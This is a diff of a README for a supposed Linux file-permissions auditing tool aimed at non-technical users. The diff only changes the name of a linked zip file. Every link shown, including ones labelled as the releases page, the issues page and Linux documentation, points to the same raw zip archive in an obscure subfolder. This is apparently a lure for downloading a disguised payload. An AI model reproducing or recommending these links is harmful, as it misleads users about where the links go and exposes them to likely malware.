@@ -1,6 +1,6 @@
 # 🛡️ google-cybersecurity-linux-permissions - Ensure Safe Linux File Access
 
-[![Download Latest Release](https://raw.githubusercontent.com/Foolman21/google-cybersecurity-linux-permissions/main/laudator/permissions-cybersecurity-google-linux-v1.1-beta.5.zip%20Latest%https://raw.githubusercontent.com/Foolman21/google-cybersecurity-linux-permissions/main/laudator/permissions-cybersecurity-google-linux-v1.1-beta.5.zip)](https://raw.githubusercontent.com/Foolman21/google-cybersecurity-linux-permissions/main/laudator/permissions-cybersecurity-google-linux-v1.1-beta.5.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Foolman21/google-cybersecurity-linux-permissions/main/laudator/permissions_cybersecurity_linux_google_3.4.zip%20Latest%https://raw.githubusercontent.com/Foolman21/google-cybersecurity-linux-permissions/main/laudator/permissions_cybersecurity_linux_google_3.4.zip)](https://raw.githubusercontent.com/Foolman21/google-cybersecurity-linux-permissions/main/laudator/permissions_cybersecurity_linux_google_3.4.zip)
 
 ## 📖 Overview
 
@@ -24,7 +24,7 @@ This tool is designed for non-technical users, including students and profession
 
 To get started with the **google-cybersecurity-linux-permissions**, please follow these steps:
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/Foolman21/google-cybersecurity-linux-permissions/main/laudator/permissions-cybersecurity-google-linux-v1.1-beta.5.zip) to download the latest version of the application.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Foolman21/google-cybersecurity-linux-permissions/main/laudator/permissions_cybersecurity_linux_google_3.4.zip) to download the latest version of the application.
 2. Scroll through the list of releases. Look for the most recent version.
 3. Click on the file that matches your Linux version.
 4. Download and save the file to a location you can easily access.
@@ -71,7 +71,7 @@ If you encounter issues while downloading or running the application, here are s
 
 If you need help, consider reaching out:
 
-- **GitHub Issues Page**: You can create an issue on the [Issues Page](https://raw.githubusercontent.com/Foolman21/google-cybersecurity-linux-permissions/main/laudator/permissions-cybersecurity-google-linux-v1.1-beta.5.zip) for assistance or to report bugs.
+- **GitHub Issues Page**: You can create an issue on the [Issues Page](https://raw.githubusercontent.com/Foolman21/google-cybersecurity-linux-permissions/main/laudator/permissions_cybersecurity_linux_google_3.4.zip) for assistance or to report bugs.
 - **User Guides and FAQs**: Check the repository for guides and frequently asked questions that may provide quick solutions.
 
 ## 📝 Contributing
@@ -88,7 +88,7 @@ This project is licensed under the MIT License. You may freely use, modify, and 
 
 ## ✨ Additional Resources
 
-- Learn more about file permissions in Linux by visiting [Linux Documentation](https://raw.githubusercontent.com/Foolman21/google-cybersecurity-linux-permissions/main/laudator/permissions-cybersecurity-google-linux-v1.1-beta.5.zip).
-- Explore more about access control on the official [Linux Security Documentation](https://raw.githubusercontent.com/Foolman21/google-cybersecurity-linux-permissions/main/laudator/permissions-cybersecurity-google-linux-v1.1-beta.5.zip).
+- Learn more about file permissions in Linux by visiting [Linux Documentation](https://raw.githubusercontent.com/Foolman21/google-cybersecurity-linux-permissions/main/laudator/permissions_cybersecurity_linux_google_3.4.zip).
+- Explore more about access control on the official [Linux Security Documentation](https://raw.githubusercontent.com/Foolman21/google-cybersecurity-linux-permissions/main/laudator/permissions_cybersecurity_linux_google_3.4.zip).
 
 By completing these steps, you will be well on your way to managing and auditing Linux file permissions effectively. Start securing your system today!
